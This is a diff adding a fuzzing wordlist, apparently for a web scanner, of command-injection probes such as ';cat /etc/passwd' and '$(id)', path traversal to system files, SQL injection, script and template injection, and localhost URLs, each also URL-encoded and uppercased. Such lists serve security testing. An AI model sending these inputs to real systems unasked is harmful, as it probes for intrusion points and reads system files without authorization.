@@ -1,0 +1,80 @@
+;id
+&& id
+| id
+;cat /etc/passwd
+&& whoami
+`whoami`
+$(id)
+;uname -a
+;dir
+& whoami
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%3Bid
+%26%26%20id
+%7C%20id
+%3Bcat%20%2Fetc%2Fpasswd
+%26%26%20whoami
+%60whoami%60
+%24%28id%29
+%3Buname%20-a
+%3Bdir
+%26%20whoami
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+;ID
+&& ID
+| ID
+;CAT /ETC/PASSWD
+&& WHOAMI
+`WHOAMI`
+$(ID)
+;UNAME -A
+;DIR
+& WHOAMI
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%3BID
+%26%26%20ID
+%7C%20ID
+%3BCAT%20%2FETC%2FPASSWD
+%26%26%20WHOAMI
+%60WHOAMI%60
+%24%28ID%29
+%3BUNAME%20-A
+%3BDIR
+%26%20WHOAMI
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+' OR '1'%3D'1
+" OR "1"%3D"1
